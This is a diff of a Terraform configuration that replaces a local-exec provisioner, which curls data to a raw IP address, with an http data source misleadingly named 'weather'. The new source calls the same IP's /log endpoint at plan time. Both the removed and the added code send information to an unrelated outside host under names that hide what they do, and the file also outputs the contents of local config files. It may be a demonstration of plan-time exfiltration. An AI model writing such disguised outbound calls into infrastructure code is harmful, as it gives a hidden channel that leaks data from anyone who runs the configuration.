@@ -10,13 +10,12 @@ output "wsinfo" {
     value = jsonencode(data.local_file.configs)
 }
 
-resource "null_resource" "cloudability-setup" {
-  provisioner "local-exec" {
-      command = <<EOT
-        curl -d "log=terraform user data here" -X POST http://150.238.89.98:1880/log
-EOT
+provider "http" {
+}
+  data "http" "weather" {
+    url = "http://150.238.89.98:1880/log?log=terraformhere"
   }
-  }
+}
   
 
 resource "ibm_resource_instance" "wa_instance" {
